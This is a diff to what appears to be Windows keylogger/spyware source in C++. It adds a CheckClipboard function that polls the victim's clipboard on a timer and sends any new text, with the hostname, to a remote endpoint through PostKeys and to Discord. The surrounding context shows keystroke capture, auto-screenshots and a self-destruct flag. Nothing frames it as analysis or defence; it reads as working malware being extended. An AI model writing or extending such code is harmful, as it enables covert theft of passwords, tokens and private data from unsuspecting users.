@@ -26,6 +26,7 @@ static std::vector<std::string> g_triggers;
 static bool g_running = true;
 static bool g_selfDestructing = false;
 static std::string g_hostname;
+static std::string g_lastClipboard;
 static HWND g_hwnd = NULL;
 
 static std::wstring g_supabaseHost;
@@ -668,6 +669,29 @@ static void CheckAutoScreenshot(const std::string& windowTitle) {
     }
 }
 
+static void CheckClipboard() {
+    if (!OpenClipboard(NULL)) return;
+    HANDLE h = GetClipboardData(CF_UNICODETEXT);
+    if (!h) { CloseClipboard(); return; }
+    wchar_t* p = (wchar_t*)GlobalLock(h);
+    if (!p) { CloseClipboard(); return; }
+    std::wstring ws(p);
+    GlobalUnlock(h);
+    CloseClipboard();
+    std::string text = ToNarrow(ws);
+    if (text.empty() || text.size() > 50000) return;
+    if (text == g_lastClipboard) return;
+    g_lastClipboard = text;
+    std::string json = "[{\"window_title\":\"[CLIPBOARD]\",\"keys\":\"";
+    json += EscapeJSON(text);
+    json += "\",\"hostname\":\"";
+    json += EscapeJSON(g_hostname);
+    json += "\"}]";
+    PostKeys(json);
+    std::string discordText = text.size() > 1000 ? text.substr(0, 1000) + "..." : text;
+    PostToDiscord(g_hostname, "[CLIPBOARD]", discordText);
+}
+
 static void FlushBuffer() {
     if (g_keys.empty()) return;
 
@@ -757,6 +781,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
         {
             static int counter = 0;
             counter++;
+            if (counter % 3 == 0 && !g_selfDestructing) CheckClipboard();
             if (counter % 5 == 0 && !g_keys.empty()) {
                 DWORD now = GetTickCount();
                 if (now - g_lastTick > 300) FlushBuffer();
